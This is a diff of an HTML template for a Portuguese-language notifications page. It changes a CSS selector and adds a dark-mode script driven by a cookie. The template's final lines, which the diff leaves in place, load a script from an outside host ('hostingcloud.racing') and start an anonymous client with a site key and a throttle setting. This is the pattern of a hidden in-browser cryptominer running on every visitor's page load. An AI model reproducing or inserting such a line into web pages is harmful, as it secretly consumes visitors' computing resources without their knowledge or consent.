@@ -11,7 +11,7 @@
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
         <title>Suas Notificações</title>
         <style>
-        	.nav {
+        	nav {
         		margin-bottom: 10px;
         	}
             .notifications {
@@ -95,6 +95,31 @@
             	{% endif %}
             </div>
         </section>
+		<script src="/static/js/cookieman.js?v=0.1"></script>
+		<script>
+function toggleDarkMode() {
+	document.body.style = "background: #222";
+	document.getElementsByClassName('navbar')[0].classList.add("bg-dark");
+	document.getElementsByClassName('navbar')[0].classList.add("navbar-dark");
+	document.getElementsByClassName('navbar')[0].classList.remove("bg-light");
+	document.getElementsByClassName('navbar')[0].classList.remove("navbar-light");
+
+	lis = document.getElementsByClassName('list-group-item')
+	for (i = 0; i < lis.length; i++) {
+	    lis[i].classList.add('bg-dark');
+	    lis[i].classList.add('text-light');
+	}
+	cards = document.getElementsByClassName('card');
+	for (i = 0; i < cards.length; i++) {
+		cards[i].classList.add('bg-dark');
+		cards[i].classList.add('text-light');
+	}
+}
+if (getDarkCookie() == 'true') {
+	toggleDarkMode();
+}
+
+		</script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
     </body>
 </html>
